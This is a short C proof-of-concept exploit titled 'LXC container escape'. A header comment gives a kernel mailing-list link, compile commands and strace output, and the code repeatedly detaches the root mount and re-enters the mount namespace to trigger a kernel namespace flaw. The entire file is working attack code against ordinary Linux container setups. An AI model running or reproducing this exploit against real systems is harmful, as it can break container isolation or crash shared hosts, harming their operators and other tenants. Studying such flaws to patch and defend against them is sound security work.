/*
 * LXC container escape
 *
 * https://groups.google.com/forum/#!topic/linux.kernel/HnegnbXk0Vs
 *
 *   borja@watergate:~/exploits $ gcc -Wall lxc-escape-nsenter.c -o lxc-escape-nsenter
 *
 *   root@ubuntu:/home/avagin# gcc -Wall nsenter.c -o nsenter
 *   root@ubuntu:/home/avagin# strace ./nsenter
 *   execve("./nsenter", ["./nsenter"], [// 22 vars //]) = 0
 *   ...
 *   open("/proc/self/ns/mnt", O_RDONLY)     = 3
 *   umount("/", MNT_DETACH)                 = 0
 *   setns(3, 131072)                        = 0
 *   umount("/", MNT_DETACH
 *
**/

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char **argv)
{
        int fd;

        fd = open("/proc/self/ns/mnt", O_RDONLY);
        if (fd < 0)
                return 1;
        while (1) {
                if (umount2("/", MNT_DETACH) ||
                    setns(fd, CLONE_NEWNS))
                        break;
        }

        return 0;
}
